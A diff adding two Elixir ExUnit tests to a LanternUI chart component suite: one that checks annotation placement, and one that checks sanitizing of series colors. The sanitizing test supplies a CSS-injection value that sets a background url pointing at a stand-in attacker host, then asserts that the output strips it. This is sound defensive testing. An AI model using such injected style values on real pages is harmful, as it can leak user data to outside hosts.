@@ -373,6 +373,46 @@ defmodule LanternUI.ChartsTest do
       assert html =~ "stroke-dasharray=\"4 2\""
     end
 
+    test "series colors accept only a single CSS custom-property reference" do
+      html =
+        render_component(&LanternUI.Charts.time_series_chart/1,
+          id: "unsafe-series-color",
+          type: :points,
+          series: [
+            %{
+              id: "a",
+              label: "A",
+              color: "var(--x);background:url(https://attacker.example/?data=...) ",
+              points: [%{x: 1, y: 2}]
+            }
+          ]
+        )
+
+      assert html =~ "--lui-series-color:var(--lantern-chart-1,"
+      refute html =~ "attacker.example"
+      refute html =~ "background:url"
+    end
+
+    test "horizontal orientation does not rotate line-chart annotations" do
+      html =
+        render_component(&LanternUI.Charts.time_series_chart/1,
+          id: "vertical-line-annotation",
+          type: :line,
+          orientation: :horizontal,
+          series: [
+            %{
+              id: "a",
+              label: "A",
+              points: [%{x: "Apr", y: 1}, %{x: "May", y: 2}, %{x: "Jun", y: 3}]
+            }
+          ],
+          annotations: [%{id: "launch", x: "May", label: "Launch"}]
+        )
+
+      assert String.contains?(html, "x1=\"366.0\" x2=\"366.0\"")
+      assert html =~ "Launch"
+    end
+
     test "the points mode renders glyphs without connecting paths" do
       html =
         render_component(&LanternUI.Charts.time_series_chart/1,
